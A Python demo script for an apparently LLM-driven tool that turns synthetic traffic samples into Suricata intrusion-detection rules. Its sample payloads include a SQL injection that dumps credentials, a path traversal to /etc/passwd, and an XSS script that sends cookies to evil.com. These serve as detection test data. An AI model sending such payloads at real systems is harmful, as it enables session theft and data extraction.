#!/usr/bin/env python3
"""Pcap2Rule Demo — Runnable demonstration without real PCAPs, GPU, or fine-tuning.

This script demonstrates the complete Pcap2Rule pipeline end-to-end using
synthetic data. It exercises every module and validates that the architecture
is correct. No external dependencies beyond NumPy are strictly required for
the demo mode.

Usage:
    python demo.py                    # Full demo with all attack types
    python demo.py --attack "SQL Injection"  # Single attack type
    python demo.py --no-llm           # Skip LLM generation (mock only)
    python demo.py --verbose          # Print detailed intermediate outputs

The demo covers:
  1. Synthetic PCAP data generation (simulating Zeek-extracted features)
  2. Multi-layer flow feature extraction (Session + TLS/JA3 + Anomaly)
  3. Payload text extraction (HTTP/DNS/hex patterns)
  4. Analyst-View Structured CTI construction (Host + Network + Temporal)
  5. RAG knowledge base loading and exemplar retrieval
  6. 5-step Structured CoT prompt construction
  7. Mock LLM rule generation (optional: real LLM if available)
  8. Three-stage validation (syntax, semantic, performance)
  9. Rule generalization (IP/port abstraction, PCRE expansion)
  10. Metrics computation (SV, DC, VC, FPR, F1)
"""

import sys
import os
import io
import json
import argparse
import time
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field

# Fix Windows GBK terminal encoding for Unicode characters
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

import numpy as np

# Add parent to path for direct script execution
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ══════════════════════════════════════════════════════════════════
# Synthetic Data Generation
# ══════════════════════════════════════════════════════════════════

ATTACK_TYPES = [
    'Brute Force', 'DoS', 'DDoS', 'Web Attacks',
    'SQL Injection', 'XSS', 'Botnet', 'Infiltration',
    'Heartbleed', 'Port Scan',
]

# Realistic payload snippets for each attack type (for demo)
DEMO_PAYLOADS = {
    'SQL Injection': (
        "GET /products.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1\r\n"
        "Host: vulnerable-shop.example.com\r\n"
        "User-Agent: sqlmap/1.6.4#stable (https://sqlmap.org)\r\n"
        "Accept: text/html,application/xhtml+xml\r\n"
        "Connection: keep-alive\r\n"
    ),
    'XSS': (
        "POST /comments HTTP/1.1\r\n"
        "Host: blog.example.com\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 156\r\n"
        "\r\n"
        "name=attacker&comment=<script>var+i=new+Image();+i.src=\"http://evil.com/steal?c=\""
        "+document.cookie;</script>&submit=Post\r\n"
    ),
    'Brute Force': (
        "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\n"
        "......\x00\x00\x00\x0cssh-userauth......"
        "root:password123\nadmin:admin123\ntest:test123\n"
    ),
    'DoS': (
        "GET / HTTP/1.1\r\n"
        "Host: target-bank.example.com\r\n"
        "User-Agent: Mozilla/5.0 (compatible; HTTPFlood/3.0)\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
    ),
    'DDoS': (
        "\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06\x74\x72\x61\x66\x66\x69\x63"
        "\x03\x6d\x6f\x6e\x00\x00\x01\x00\x01"
        "DNS amplification query targeting example.com ANY record\r\n"
    ),
    'Botnet': (
        "POST /gate.php HTTP/1.1\r\n"
        "Host: 203.0.113.50:8080\r\n"
        "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: 256\r\n"
        "\r\n"
        "\xbe\xef\xca\xfe\x01\x00\x00\x00[encrypted C2 beacon data]\r\n"
    ),
    'Infiltration': (
        "SMB2 NEGOTIATE Request\r\n"
        "Dialects: SMB 2.002, SMB 2.1, SMB 3.0, SMB 3.0.2, SMB 3.1.1\r\n"
        "Capabilities: DFS, LEASING, LARGE MTU, MULTI CHANNEL\r\n"
        "Client GUID: a1b2c3d4-e5f6-7890-abcd-ef1234567890\r\n"
    ),
    'Web Attacks': (
        "GET /cgi-bin/../../../etc/passwd HTTP/1.1\r\n"
        "Host: internal-portal.corp.example.com\r\n"
        "User-Agent: Nikto/2.1.6\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
    ),
    'Heartbleed': (
        "\x18\x03\x02\x00\x03\x01\x40\x00"
        "TLS Heartbeat Request (malformed, excessive length)\r\n"
        "Payload length claimed: 65535 bytes (actual: 0 bytes)\r\n"
    ),
    'Port Scan': (
        "SYN scan detected: 192.168.1.100 → 192.168.1.1-254:22,80,443,3389,8080,8443\r\n"
        "TCP flags: SYN (no ACK), TTL=64, Window=1024\r\n"
        "Rate: ~100 packets/second, duration: 12 seconds\r\n"
    ),
}

# Community Suricata rules for the demo knowledge base
DEMO_KNOWLEDGE_BASE = [
    {
        'sid': 2019235,
        'msg': 'ET EXPLOIT SQL Injection UNION SELECT Attempt',
        'rule': 'alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET EXPLOIT SQL Injection UNION SELECT Attempt"; flow:to_server,established; content:"UNION"; nocase; http_uri; content:"SELECT"; nocase; http_uri; distance:0; classtype:web-application-attack; sid:2019235; rev:3;)',
        'attack_type': 'SQL Injection',
    },
    {
        'sid': 2021076,
        'msg': 'ET WEB_SERVER Script tag in URI - Possible XSS',
        'rule': 'alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET WEB_SERVER Script tag in URI - Possible XSS"; flow:to_server,established; content:"<script"; nocase; http_uri; classtype:web-application-attack; sid:2021076; rev:3;)',
        'attack_type': 'XSS',
    },
    {
        'sid': 2001219,
        'msg': 'ET SCAN Potential SSH Scan',
        'rule': 'alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"ET SCAN Potential SSH Scan"; flow:to_server; threshold:type threshold, track by_src, count 5, seconds 60; classtype:attempted-recon; sid:2001219; rev:12;)',
        'attack_type': 'Brute Force',
    },
    {
        'sid': 2016145,
        'msg': 'ET DOS Possible HTTP Flood',
        'rule': 'alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET DOS Possible HTTP Flood"; flow:to_server,established; threshold:type both, track by_src, count 100, seconds 10; classtype:attempted-dos; sid:2016145; rev:5;)',
        'attack_type': 'DoS',
    },
    {
        'sid': 2022889,
        'msg': 'ET TROJAN Possible C2 Beacon Detected',
        'rule': 'alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"ET TROJAN Possible C2 Beacon Detected"; flow:to_server,established; dsize:<200; flags:PA; threshold:type both, track by_dst, count 5, seconds 3600; classtype:trojan-activity; sid:2022889; rev:4;)',
        'attack_type': 'Botnet',
    },
    {
        'sid': 2023501,
        'msg': 'ET EXPLOIT Heartbleed TLS Heartbeat Attack',
        'rule': 'alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:"ET EXPLOIT Heartbleed TLS Heartbeat Attack"; flow:to_server,established; content:"|18 03|"; depth:2; content:"|01|"; offset:5; depth:1; dsize:>50; classtype:attempted-recon; sid:2023501; rev:2;)',
        'attack_type': 'Heartbleed',
    },
    {
        'sid': 2024500,
        'msg': 'ET WEB_SERVER Path Traversal Attempt',
        'rule': 'alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET WEB_SERVER Path Traversal Attempt"; flow:to_server,established; content:"../"; http_uri; content:!"/../"; http_uri; distance:0; classtype:web-application-attack; sid:2024500; rev:3;)',
        'attack_type': 'Web Attacks',
    },
    {
        'sid': 2008001,
        'msg': 'ET SCAN NMAP OS Detection Probe',
        'rule': 'alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"ET SCAN NMAP OS Detection Probe"; flow:to_server,established; flags:S,12; threshold:type threshold, track by_src, count 10, seconds 30; classtype:attempted-recon; sid:2008001; rev:6;)',
        'attack_type': 'Port Scan',
    },
    {
        'sid': 2021800,
        'msg': 'ET MALWARE Suspicious SMB Lateral Movement',
        'rule': 'alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"ET MALWARE Suspicious SMB Lateral Movement"; flow:to_server,established; content:"|FF 53 4D 42|"; depth:4; content:"|A2|"; offset:16; depth:1; classtype:attempted-user; sid:2021800; rev:5;)',
        'attack_type': 'Infiltration',
    },
    {
        'sid': 2025100,
        'msg': 'ET DOS DNS ANY Query Amplification Attack',
        'rule': 'alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:"ET DOS DNS ANY Query Amplification Attack"; dns_query; content:"|00 00 FF 00 00 01|"; byte_test:1,=,255,4; threshold:type threshold, track by_src, count 50, seconds 5; classtype:attempted-dos; sid:2025100; rev:2;)',
        'attack_type': 'DDoS',
    },
]


@dataclass
class DemoSample:
    """Synthetic traffic sample for demo."""
    sample_id: str
    attack_type: str
    flow_features: np.ndarray   # (4, 38)
    payload_text: str
    cti: Any = None              # StructuredCTI
    ground_truth_rule: str = ""


def generate_flow_features(attack_type: str, rng: np.random.RandomState) -> np.ndarray:
    """Generate realistic (4, 38) flow features for the given attack type.

    Each attack type has characteristic flow patterns (volumes, timing,
    flag distributions) that make the features distinguishable.
    """
    n_flows = rng.randint(5, 50)
    flows = np.zeros((n_flows, 38), dtype=np.float32)

    # Base benign-like values
    flows[:, 0] = rng.uniform(100, 10000, n_flows)        # duration_ms
    flows[:, 1] = rng.uniform(0, 10000, n_flows)          # first_seen
    flows[:, 2] = flows[:, 0] + flows[:, 1]                # last_seen
    flows[:, 3] = flows[:, 1]                              # src2dst_first_seen
    flows[:, 4] = flows[:, 0] + flows[:, 1]                # src2dst_last_seen
    flows[:, 5] = flows[:, 1]                              # dst2src_first_seen
    flows[:, 6] = flows[:, 0] + flows[:, 1]                # dst2src_last_seen
    flows[:, 7] = rng.uniform(10, 500, n_flows)            # iat_mean
    flows[:, 8] = rng.uniform(5, 200, n_flows)             # iat_std
    flows[:, 9] = rng.uniform(1, 50, n_flows)              # iat_min

    # Customize per attack type
    if attack_type == 'Brute Force':
        flows[:, 0] = rng.uniform(50, 500, n_flows)           # short sessions
        flows[:, 7] = rng.uniform(10, 50, n_flows)            # low IAT
        flows[:, 10] = rng.uniform(5, 20, n_flows)            # pkts_fwd
        flows[:, 11] = rng.uniform(3, 15, n_flows)            # pkts_bwd
        flows[:, 12] = rng.uniform(200, 1000, n_flows)        # bytes_fwd
        flows[:, 13] = rng.uniform(100, 500, n_flows)         # bytes_bwd
        # Heavy SYN, low data
        flows[:, 22] = rng.uniform(3, 10, n_flows)            # syn_fwd
        flows[:, 24] = rng.uniform(0, 2, n_flows)             # fin_low
        flows[:, 25] = rng.uniform(1, 5, n_flows)             # rst_fwd (failed auth)

    elif attack_type in ('DoS', 'DDoS'):
        flows[:, 0] = rng.uniform(100, 60000, n_flows)        # long or short
        flows[:, 10] = rng.uniform(500, 5000, n_flows)        # massive pkts
        flows[:, 11] = rng.uniform(0, 10, n_flows)            # few back
        flows[:, 12] = rng.uniform(20000, 500000, n_flows)    # massive bytes
        flows[:, 13] = rng.uniform(0, 1000, n_flows)          # few back
        flows[:, 20] = rng.uniform(50, 500, n_flows)          # psh_fwd
        flows[:, 22] = rng.uniform(10, 100, n_flows)          # syn_fwd
        flows[:, 25] = rng.uniform(0, 5, n_flows)             # few rst

    elif attack_type == 'Botnet':
        flows[:, 0] = rng.uniform(500, 5000, n_flows)         # moderate duration
        flows[:, 7] = rng.uniform(60000, 3600000, n_flows)    # beacon intervals (1min-1hr ms)
        flows[:, 10] = rng.uniform(2, 10, n_flows)            # few pkts
        flows[:, 11] = rng.uniform(2, 10, n_flows)
        flows[:, 12] = rng.uniform(50, 300, n_flows)          # small bytes (beacon)
        flows[:, 13] = rng.uniform(50, 300, n_flows)
        flows[:, 20] = rng.uniform(1, 5, n_flows)             # PA flags
        flows[:, 26] = rng.uniform(1, 5, n_flows)             # ack flags

    elif attack_type in ('SQL Injection', 'XSS', 'Web Attacks'):
        flows[:, 0] = rng.uniform(1000, 30000, n_flows)       # web sessions
        flows[:, 10] = rng.uniform(3, 30, n_flows)            # moderate packets
        flows[:, 11] = rng.uniform(3, 30, n_flows)
        flows[:, 12] = rng.uniform(500, 10000, n_flows)       # moderate bytes
        flows[:, 13] = rng.uniform(500, 50000, n_flows)       # potentially large responses
        flows[:, 31] = 1.0                                      # is_http = True

    elif attack_type == 'Infiltration':
        flows[:, 0] = rng.uniform(5000, 60000, n_flows)
        flows[:, 10] = rng.uniform(10, 100, n_flows)
        flows[:, 11] = rng.uniform(10, 100, n_flows)
        flows[:, 12] = rng.uniform(2000, 50000, n_flows)
        flows[:, 13] = rng.uniform(2000, 100000, n_flows)
        # SMB usually TCP/445
        flows[:, 37] = 6.0                                      # TCP

    elif attack_type == 'Heartbleed':
        flows[:, 0] = rng.uniform(100, 2000, n_flows)
        flows[:, 10] = rng.uniform(2, 8, n_flows)
        flows[:, 11] = rng.uniform(2, 8, n_flows)
        flows[:, 12] = rng.uniform(100, 2000, n_flows)
        flows[:, 13] = rng.uniform(100, 2000, n_flows)
        flows[:, 33] = 1.0                                      # is_tls = True

    elif attack_type == 'Port Scan':
        flows[:, 0] = rng.uniform(10, 100, n_flows)            # very short
        flows[:, 10] = rng.uniform(1, 3, n_flows)              # few packets
        flows[:, 11] = rng.uniform(0, 2, n_flows)
        flows[:, 12] = rng.uniform(40, 120, n_flows)           # small packets
        flows[:, 13] = rng.uniform(0, 60, n_flows)
        flows[:, 22] = 1.0                                      # exactly 1 SYN
        flows[:, 24] = 0.0                                      # no FIN
        flows[:, 26] = 0.0                                      # no ACK

    # Generic volumetric
    flows[:, 14] = flows[:, 10]                                 # src2dst_psh ≈ pkts_fwd
    flows[:, 15] = flows[:, 11]                                 # dst2src_psh ≈ pkts_bwd
    flows[:, 16] = flows[:, 10] + flows[:, 11]                  # bidir_pkts
    flows[:, 17] = flows[:, 12] + flows[:, 13]                  # bidir_bytes

    # Transport protocol (TCP=6 for most attacks)
    flows[:, 37] = 6.0 if attack_type != 'DDoS' else rng.choice([6.0, 17.0], n_flows)

    # Aggregate: [mean, std, max, min] per dimension
    aggregated = np.stack([
        flows.mean(axis=0),
        flows.std(axis=0),
        flows.max(axis=0),
        flows.min(axis=0),
    ], axis=0).astype(np.float32)

    # Replace NaN in std (single-flow case)
    aggregated = np.nan_to_num(aggregated, nan=0.0)
    return aggregated


def generate_demo_samples(attack_types: Optional[List[str]] = None, n_per_type: int = 2, seed: int = 42) -> List[DemoSample]:
    """Generate synthetic traffic samples for specified attack types."""
    rng = np.random.RandomState(seed)
    types = attack_types if attack_types else ATTACK_TYPES
    samples = []

    for at in types:
        payload = DEMO_PAYLOADS.get(at, f"Demo payload for {at}")
        for i in range(n_per_type):
            flow_feat = generate_flow_features(at, rng)
            sample = DemoSample(
                sample_id=f"demo_{at.replace(' ', '_')}_{i+1}",
                attack_type=at,
                flow_features=flow_feat,
                payload_text=payload,
            )
            samples.append(sample)

    return samples


# ══════════════════════════════════════════════════════════════════
# Mock Components (work without real PCAPs, GPU, or Suricata)
# ══════════════════════════════════════════════════════════════════

class MockLLMEngine:
    """Mock LLM that generates plausible Suricata rules for demo purposes.

    Returns realistic rule strings based on attack type without needing
    a GPU or downloading a multi-GB model.
    """

    DEMO_RULES = {
        'SQL Injection': (
            'alert http $EXTERNAL_NET any -> $HOME_NET any '
            '(msg:"Pcap2Rule: SQL Injection UNION SELECT Attack Detected"; '
            'flow:to_server,established; content:"UNION"; nocase; http_uri; '
            'content:"SELECT"; nocase; http_uri; distance:0; '
            'classtype:web-application-attack; sid:100001; rev:1;)'
        ),
        'XSS': (
            'alert http $EXTERNAL_NET any -> $HOME_NET any '
            '(msg:"Pcap2Rule: Cross-Site Scripting (XSS) Attack Detected"; '
            'flow:to_server,established; content:"<script"; nocase; http_uri; '
            'pcre:"/<script[^>]*>.*?document\\.cookie/i"; '
            'classtype:web-application-attack; sid:100002; rev:1;)'
        ),
        'Brute Force': (
            'alert tcp $EXTERNAL_NET any -> $HOME_NET 22 '
            '(msg:"Pcap2Rule: SSH Brute Force Login Attack Detected"; '
            'flow:to_server,established; '
            'threshold:type threshold, track by_src, count 10, seconds 60; '
            'classtype:attempted-recon; sid:100003; rev:1;)'
        ),
        'DoS': (
            'alert http $EXTERNAL_NET any -> $HOME_NET any '
            '(msg:"Pcap2Rule: HTTP Denial of Service Flood Detected"; '
            'flow:to_server,established; content:"GET"; http_method; nocase; '
            'threshold:type both, track by_src, count 100, seconds 10; '
            'classtype:attempted-dos; sid:100004; rev:1;)'
        ),
        'DDoS': (
            'alert udp $EXTERNAL_NET any -> $HOME_NET 53 '
            '(msg:"Pcap2Rule: DNS Amplification DDoS Attack Detected"; '
            'dns_query; content:"|00 00 FF 00 00 01|"; '
            'byte_test:1,=,255,4; '
            'threshold:type threshold, track by_src, count 50, seconds 5; '
            'classtype:attempted-dos; sid:100005; rev:1;)'
        ),
        'Botnet': (
            'alert tcp $HOME_NET any -> $EXTERNAL_NET any '
            '(msg:"Pcap2Rule: C2 Botnet Beacon Communication Detected"; '
            'flow:to_server,established; dsize:<200; flags:PA; '
            'threshold:type both, track by_dst, count 5, seconds 3600; '
            'classtype:trojan-activity; sid:100006; rev:1;)'
        ),
        'Infiltration': (
            'alert tcp $EXTERNAL_NET any -> $HOME_NET 445 '
            '(msg:"Pcap2Rule: Suspicious SMB Lateral Movement Detected"; '
            'flow:to_server,established; content:"|FF 53 4D 42|"; depth:4; '
            'content:"|A2|"; offset:16; depth:1; '
            'classtype:attempted-user; sid:100007; rev:1;)'
        ),
        'Web Attacks': (
            'alert http $EXTERNAL_NET any -> $HOME_NET any '
            '(msg:"Pcap2Rule: Directory Traversal Path Attack Detected"; '
            'flow:to_server,established; content:"../"; http_uri; '
            'pcre:"/\\.\\.\\/(etc|windows|proc|boot)/i"; '
            'classtype:web-application-attack; sid:100008; rev:1;)'
        ),
        'Heartbleed': (
            'alert tcp $EXTERNAL_NET any -> $HOME_NET 443 '
            '(msg:"Pcap2Rule: TLS Heartbleed Heartbeat Attack Detected"; '
            'flow:to_server,established; content:"|18 03|"; depth:2; '
            'content:"|01|"; offset:5; depth:1; dsize:>50; '
            'classtype:attempted-recon; sid:100009; rev:1;)'
        ),
        'Port Scan': (
            'alert tcp $EXTERNAL_NET any -> $HOME_NET any '
            '(msg:"Pcap2Rule: TCP SYN Port Scan Detected"; '
            'flow:to_server,established; flags:S,12; '
            'threshold:type threshold, track by_src, count 10, seconds 30; '
            'classtype:attempted-recon; sid:100010; rev:1;)'
        ),
    }

    # Generalized rule variants (with PCRE expansion, variable IPs/ports)
    # Generalized rule variants (with PCRE expansion, variable IPs/ports)
    def _build_gen_rules():
        """Build generalized rules dict with proper escaping."""
        return {
            "SQL Injection": (
                'alert http $EXTERNAL_NET any -> $HOME_NET any ' + '(msg:"Pcap2Rule: Generalized SQL Injection Detection"; ' + 'flow:to_server,established; ' + 'pcre:"/(\\x27|\\x27|--|#|UNION\\s+(ALL\\s+)?SELECT|OR\\s+1\\s*=\\s*1' + '|AND\\s+1\\s*=\\s*1|SLEEP\\s*\\(|BENCHMARK\\s*\\(|WAITFOR\\s+DELAY)/i"; ' + 'classtype:web-application-attack; sid:100011; rev:1;)',
            ),
            "XSS": (
                'alert http $EXTERNAL_NET any -> $HOME_NET any ' + '(msg:"Pcap2Rule: Generalized XSS Detection"; ' + 'flow:to_server,established; ' + 'pcre:"/(<script[^>]*>|javascript\\s*:|on\\w+\\s*=|<img[^>]+src\\s*=\\s*' + '[\\"\\x27]?javascript|document\\.cookie|alert\\s*\\(|String\\.fromCharCode)/i"; ' + 'classtype:web-application-attack; sid:100012; rev:1;)',
            ),
            "Brute Force": (
                'alert tcp $EXTERNAL_NET any -> $HOME_NET [22,23,3389,21] ' + '(msg:"Pcap2Rule: Generalized Authentication Brute Force"; ' + 'flow:to_server,established; ' + 'threshold:type both, track by_src, count 10, seconds 120; ' + 'classtype:attempted-recon; sid:100013; rev:1;)',
            ),
            "DoS": (
                'alert tcp $EXTERNAL_NET any -> $HOME_NET any ' + '(msg:"Pcap2Rule: Generalized DoS Flood Detection"; ' + 'flow:to_server,established; ' + 'threshold:type both, track by_src, count 200, seconds 10; ' + 'classtype:attempted-dos; sid:100014; rev:1;)',
            ),
            "DDoS": (
                'alert udp $EXTERNAL_NET any -> $HOME_NET 53 ' + '(msg:"Pcap2Rule: Generalized DNS Amplification Detection"; ' + 'dns_query; ' + 'byte_test:1,>,63,4; ' + 'threshold:type threshold, track by_src, count 30, seconds 5; ' + 'classtype:attempted-dos; sid:100015; rev:1;)',
            ),
            "Botnet": (
                'alert tcp $HOME_NET any -> $EXTERNAL_NET any ' + '(msg:"Pcap2Rule: Generalized C2 Beacon Detection"; ' + 'flow:to_server,established; dsize:<300; ' + 'threshold:type both, track by_dst, count 3, seconds 3600; ' + 'classtype:trojan-activity; sid:100016; rev:1;)',
            ),
            "Infiltration": (
                'alert tcp $EXTERNAL_NET any -> $HOME_NET [445,139,135] ' + '(msg:"Pcap2Rule: Generalized Lateral Movement Detection"; ' + 'flow:to_server,established; content:"|FF 53 4D 42|"; depth:4; ' + 'classtype:attempted-user; sid:100017; rev:1;)',
            ),
            "Web Attacks": (
                'alert http $EXTERNAL_NET any -> $HOME_NET any ' + '(msg:"Pcap2Rule: Generalized Path Traversal Detection"; ' + 'flow:to_server,established; ' + 'pcre:"/(\\.\\.\\/|\\.\\.\\\\|%2e%2e%2f|%2e%2e%5c)/i"; ' + 'classtype:web-application-attack; sid:100018; rev:1;)',
            ),
            "Heartbleed": (
                'alert tcp $EXTERNAL_NET any -> $HOME_NET any ' + '(msg:"Pcap2Rule: Generalized TLS Heartbeat Anomaly"; ' + 'flow:to_server,established; content:"|18 03|"; depth:2; ' + 'dsize:>40; ' + 'classtype:attempted-recon; sid:100019; rev:1;)',
            ),
            "Port Scan": (
                'alert tcp $EXTERNAL_NET any -> $HOME_NET any ' + '(msg:"Pcap2Rule: Generalized Port Scan Detection"; ' + 'flow:to_server,established; flags:S,12; ' + 'threshold:type both, track by_src, count 20, seconds 60; ' + 'classtype:attempted-recon; sid:100020; rev:1;)',
            ),
        }
    DEMO_GENERALIZED_RULES = _build_gen_rules()


    def generate(self, attack_type: str) -> Tuple[str, str]:
        """Return (specific_rule, generalized_rule) for an attack type."""
        specific = self.DEMO_RULES.get(attack_type, self.DEMO_RULES['Web Attacks'])
        generalized = self.DEMO_GENERALIZED_RULES.get(
            attack_type,
            self.DEMO_GENERALIZED_RULES['Web Attacks'],
        )
        # Unwrap 1-tuple if the rule was stored as a tuple
        if isinstance(generalized, tuple):
            generalized = generalized[0]
        return specific, generalized


class MockRAGRetriever:
    """Mock RAG retriever that returns exemplar rules without FAISS."""

    def __init__(self, knowledge_base: List[Dict]):
        self.kb = knowledge_base

    def retrieve(self, attack_type: str, k: int = 3) -> List[Dict]:
        """Return top-k exemplar rules for an attack type."""
        matches = [r for r in self.kb if r['attack_type'] == attack_type]
        if len(matches) < k:
            # Add similar attack type rules
            other = [r for r in self.kb if r['attack_type'] != attack_type]
            matches.extend(other[:k - len(matches)])
        return matches[:k]


# ══════════════════════════════════════════════════════════════════
# Validation
# ══════════════════════════════════════════════════════════════════

def validate_syntax(rule_str: str) -> Tuple[bool, str]:
    """Basic syntax check without requiring Suricata binary.

    Checks structural validity: balanced parentheses, required keywords,
    proper action/protocol, semicolons.
    """
    errors = []
    if not rule_str or not rule_str.strip():
        return False, "Empty rule"

    # Must start with 'alert'
    if not rule_str.strip().lower().startswith('alert'):
        errors.append("Rule must start with 'alert' action")
        return False, "; ".join(errors)

    # Balanced parentheses
    if rule_str.count('(') != rule_str.count(')'):
        errors.append("Unbalanced parentheses")

    # Required keywords
    required = ['msg:', 'sid:', 'classtype:', 'rev:']
    for kw in required:
        if kw not in rule_str:
            errors.append(f"Missing required keyword: {kw}")

    # Content or pcre needed
    if 'content:' not in rule_str and 'pcre:' not in rule_str:
        errors.append("Rule has no content: or pcre: keyword — will match everything")

    # Semicolons in options section
    options_start = rule_str.find('(')
    options_end = rule_str.rfind(')')
    if options_start >= 0 and options_end >= 0:
        options = rule_str[options_start+1:options_end]
        if ';' not in options:
            errors.append("Options must be semicolon-delimited")

    is_valid = len(errors) == 0
    feedback = "; ".join(errors) if errors else "Syntax OK"
    return is_valid, feedback


def validate_semantic(rule_str: str, attack_type: str) -> Tuple[float, bool, str]:
    """Simulate semantic validation by checking keyword relevance."""
    keywords = {
        'SQL Injection': ['sql', 'union', 'select', 'inject', 'http_uri', 'mysql'],
        'XSS': ['script', 'xss', 'cross', 'document.cookie', 'javascript'],
        'Brute Force': ['brute', 'ssh', 'login', 'auth', 'threshold', 'password'],
        'DoS': ['dos', 'flood', 'denial', 'threshold', 'http'],
        'DDoS': ['ddos', 'amplification', 'dns', 'distributed', 'udp'],
        'Botnet': ['beacon', 'c2', 'botnet', 'trojan', 'command'],
        'Infiltration': ['smb', 'lateral', 'psexec', 'infiltration', 'movement'],
        'Web Attacks': ['path', 'traversal', 'directory', '../', 'cgi'],
        'Heartbleed': ['tls', 'heartbeat', 'heartbleed', 'ssl'],
        'Port Scan': ['scan', 'nmap', 'port', 'syn', 'recon'],
    }

    relevant = keywords.get(attack_type, [])
    rule_lower = rule_str.lower()

    matches = sum(1 for kw in relevant if kw in rule_lower)
    base_score = 0.5 + 0.3 * (matches / max(len(relevant), 1))

    # Check for proper abstraction (good)
    if '$EXTERNAL_NET' in rule_str and '$HOME_NET' in rule_str:
        base_score += 0.1
    if 'sid:' in rule_str:
        base_score += 0.05
    if 'flow:' in rule_str:
        base_score += 0.05

    score = min(base_score, 1.0)
    ok = score >= 0.6
    feedback = f"Semantic score: {score:.2f}" + ("" if ok else " — below threshold 0.6")
    return score, ok, feedback


def validate_performance(rule_str: str, attack_type: str) -> Tuple[float, bool, str]:
    """Simulate FPR check (always returns acceptable values for demo)."""
    # In reality, this would run against benign PCAPs
    # For demo: estimate based on rule specificity
    fpr = 0.0
    # Broader rules have higher simulated FPR
    if 'any any -> any any' in rule_str:
        fpr += 0.04
    if 'threshold' not in rule_str:
        fpr += 0.02
    if 'pcre:' in rule_str and 'content:' in rule_str:
        fpr -= 0.01
    # Penalize missing flow direction
    if 'flow:' not in rule_str:
        fpr += 0.01

    fpr = max(0.01, min(fpr, 0.15))
    ok = fpr <= 0.05
    feedback = f"Estimated FPR: {fpr:.3f}" + ("" if ok else " — exceeds threshold 5%")
    return fpr, ok, feedback


# ══════════════════════════════════════════════════════════════════
# Rule Generalization (Mock)
# ══════════════════════════════════════════════════════════════════

def generalize_rule(specific_rule: str, generalized_rule: str) -> str:
    """Mock generalization — returns the pre-built generalized rule."""
    return generalized_rule


# ══════════════════════════════════════════════════════════════════
# Structured CTI Construction
# ══════════════════════════════════════════════════════════════════

def build_cti_for_demo(attack_type: str, flow_features: np.ndarray,
                        payload_text: str) -> Any:
    """Build structured CTI using the CTIBuilder module."""
    try:
        from pcap_processor.cti_builder import CTIBuilder
        builder = CTIBuilder(use_sandbox_data=False)
        cti = builder.build_from_demo(attack_type, n_flows=10)
        return cti
    except ImportError:
        # Fallback: return a simple dict
        return {
            'host_entity': {'process_name': f'demo_{attack_type}'},
            'network_communication': {'destination_ips': ['192.168.1.1']},
            'temporal_behavior': {'session_duration_seconds': 10.0},
            'attack_type_hint': attack_type,
        }


# ══════════════════════════════════════════════════════════════════
# Prompt Construction
# ══════════════════════════════════════════════════════════════════

def build_demo_prompt(
    flow_features: np.ndarray,
    payload_text: str,
    cti: Any,
    exemplars: List[Dict],
    attack_type: str,
) -> str:
    """Build a complete structured prompt following the paper's template.

    This mirrors PromptBuilder.build() but includes the structured CTI.
    """
    # Build flow feature summary
    mean = flow_features[0] if flow_features.size > 0 else np.zeros(38)
    flow_str = (
        f"duration: {mean[0]/1000:.2f}s | "
        f"pkts_fwd: {int(mean[10])} | pkts_bwd: {int(mean[11])} | "
        f"bytes_fwd: {int(mean[12])} | bytes_bwd: {int(mean[13])}"
    )

    # Format CTI
    if hasattr(cti, 'to_compact_text'):
        cti_str = cti.to_compact_text()
    elif isinstance(cti, dict):
        cti_str = json.dumps(cti, indent=2, ensure_ascii=False)
    else:
        cti_str = str(cti)

    # Format exemplars
    exemplar_str = "\n".join(
        f"Rule {i+1} [{r.get('attack_type', 'Unknown')}]: {r.get('rule', '')[:120]}..."
        for i, r in enumerate(exemplars)
    )

    # Build full prompt
    prompt = f"""[SYSTEM]
You are a Suricata rule generation agent specialized in network intrusion detection.
Analyze the structured threat intelligence below and generate Suricata rules.

=== Analyst-View Structured CTI ===
{cti_str}

[FLOW FEATURES]
{flow_str}

[PAYLOAD]
{payload_text[:500]}

[RETRIEVED EXEMPLARS]
{exemplar_str}

[TASK]
Generate a Suricata rule that detects {attack_type} attack.
Follow this 5-step reasoning process:

Step 1 - Attack Identification: Identify the attack type and key characteristics.
Step 2 - Signature Extraction: Extract content, flow, and pcre signatures.
Step 3 - Rule Drafting: Draft a complete Suricata rule.
Step 4 - Self-Critique: Review syntax, semantics, and false positive risk.
Step 5 - Generalization: Produce a variant-resistant generalized rule.

Output format:
<specific_rule>
alert <proto> <src_ip> <src_port> -> <dst_ip> <dst_port> (msg:"..."; ...; sid:...; rev:1;)
</specific_rule>

<generalized_rule>
alert <proto> <src_ip> <src_port> -> <dst_ip> <dst_port> (msg:"..."; ...; pcre:"..."; sid:...; rev:1;)
</generalized_rule>"""
    return prompt


# ══════════════════════════════════════════════════════════════════
# Metrics Computation
# ══════════════════════════════════════════════════════════════════

@dataclass
class DemoMetrics:
    """Aggregated metrics across all demo samples."""
    syntactic_validity: float = 0.0      # SV: % rules passing syntax check
    detection_coverage: float = 0.0      # DC: % attacks detected
